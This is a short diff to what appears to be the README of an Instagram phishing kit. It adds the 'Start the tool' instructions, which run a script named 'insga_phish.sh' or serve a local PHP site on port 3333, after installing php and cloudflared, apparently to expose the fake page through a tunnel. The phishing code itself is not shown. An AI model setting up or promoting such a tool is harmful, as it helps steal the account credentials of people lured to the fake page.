@@ -27,3 +27,7 @@ apt install php
 apt install cloudflared
 ```
 ## Start the tool 
+
+`insga_phish.sh`
+      or
+`php -d opcache.enable=0 -S 127.0.0.1:3333 -t www`
